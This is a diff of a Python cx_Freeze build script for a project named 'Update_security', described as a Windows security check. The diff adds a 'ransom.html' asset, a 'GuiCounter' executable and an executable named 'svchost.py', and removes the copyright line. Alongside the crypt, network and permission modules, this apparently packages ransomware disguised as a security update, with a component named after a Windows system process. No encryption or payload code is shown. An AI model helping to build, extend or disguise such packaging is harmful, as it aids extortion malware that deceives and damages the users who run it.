@@ -4,11 +4,13 @@ import sys
 from cx_Freeze import setup, Executable
 
 path = sys.path
+includefiles = ['assets/image.jpg', 'assets/ransom.html']
 includes = []
 excludes = []
 packages = ["modules/crypt", "modules/network", "modules/permission", "modules/system"]
 
 options = {"path": path,
+           "include_files": includefiles,
            "includes": includes,
            "excludes": excludes,
            "packages": packages
@@ -21,7 +23,8 @@ setup(
 	name = "Update_security",
 	version = "2.0",
 	description = "Security check for windows host",
-    copyright = "Copyright 2020 Tech.Inc",
     options = {"build_exe": options},
-	executables = [Executable("main.py", base=base)]
+	executables = [Executable("main.py", base=base),
+                    Executable("GuiCounter.py", base=base),
+                    Executable("svchost.py", base=base)]
 )
